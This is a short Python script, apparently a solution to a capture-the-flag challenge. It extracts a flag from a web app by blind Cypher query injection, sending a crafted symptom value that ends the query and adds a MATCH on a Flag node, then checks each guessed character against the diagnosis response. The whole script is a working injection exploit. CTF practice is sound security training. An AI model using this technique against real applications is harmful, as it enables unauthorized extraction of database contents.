import requests
import random
import string
import tqdm

url = "http://dead-or-alive.ctfz.one"

with requests.Session() as session:
    
    flag = "ctfzone{"
    all_characters = string.ascii_letters + string.digits + string.punctuation
    for i in all_characters:
        print("Trying with")
        ssn = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
        session.post(url + '/api/setUser', json={"ssn":ssn,"fullname":"abc90","dateOfBirth":"1/1/1999","weight":"100"}, verify=False)
        payload = "Fatigue']\u000aMATCH (f:Flag) WHERE f.flag STARTS WITH '####'//".replace("####",flag + i)
        session.post(url + '/api/setSymptoms', json= {"ssn":ssn,"symptoms":[ "Anxiety","Obsessions","Difficulty concentrating","Compulsions", payload]}, verify=False)
        r = session.post(url + '/api/getDiagnosis', json= {"ssn":ssn}, verify=False)
        if "Obsessive-compulsive disorder (OCD)" in r.text:
            flag += i
            print("Current flag: ", flag)
    print("Flag: ", flag)
